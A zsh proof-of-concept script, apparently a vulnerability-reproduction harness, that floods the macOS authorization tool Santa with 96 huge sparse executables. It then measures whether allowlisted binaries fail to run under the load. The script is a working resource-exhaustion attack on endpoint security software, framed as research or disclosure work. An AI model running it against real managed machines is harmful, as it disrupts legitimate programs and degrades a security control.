#!/bin/zsh
set -euo pipefail
cd "${0:A:h}"
test -x artifacts/payload
test -x artifacts/SantaRace.app/Contents/MacOS/SantaRace

work="$(/usr/bin/mktemp -d "$PWD/.santa-overload.XXXXXX")"
trap '/usr/bin/pkill -P $$ 2>/dev/null || true; /bin/rm -rf "$work"' EXIT
/bin/rm -f /tmp/santa-poc-benign-ran

print '[baseline] 20 fresh allowlisted vnodes'
for i in {1..20}; do
  /bin/cp artifacts/SantaRace.app/Contents/MacOS/SantaRace "$work/base-$i"
  "$work/base-$i" >/dev/null 2>&1 || true
done
baseline=$(/usr/bin/wc -l < /tmp/santa-poc-benign-ran | /usr/bin/tr -d ' ')
if [[ "$baseline" -ne 20 ]]; then
  print "INVALID TEST: baseline allowlisted executions=$baseline/20"
  exit 2
fi

print '[load] creating 96 distinct 16-GiB sparse executable vnodes'
for i in {1..96}; do
  /usr/bin/mkfile -n 16g "$work/bomb-$i"
  /bin/dd if=artifacts/payload of="$work/bomb-$i" conv=notrunc >/dev/null 2>&1
  /bin/chmod 755 "$work/bomb-$i"
  /bin/cp artifacts/SantaRace.app/Contents/MacOS/SantaRace "$work/probe-$i"
done

for i in {1..96}; do
  "$work/bomb-$i" >/dev/null 2>&1 &
done
/bin/sleep 1

before=$(/usr/bin/wc -l < /tmp/santa-poc-benign-ran | /usr/bin/tr -d ' ')
for i in {1..96}; do
  "$work/probe-$i" >/dev/null 2>&1 &
done
wait || true
after=$(/usr/bin/wc -l < /tmp/santa-poc-benign-ran | /usr/bin/tr -d ' ')
ran=$((after - before))

if [[ "$ran" -lt 96 ]]; then
  print "CANDIDATE OBSERVED: allowlisted probes executed=$ran/96 during load"
  print 'Confirm Santa deadline logs and repeat once before classifying the finding CONFIRMED.'
  exit 3
fi
print 'NOT REPRODUCIBLE: all allowlisted probes executed during load'
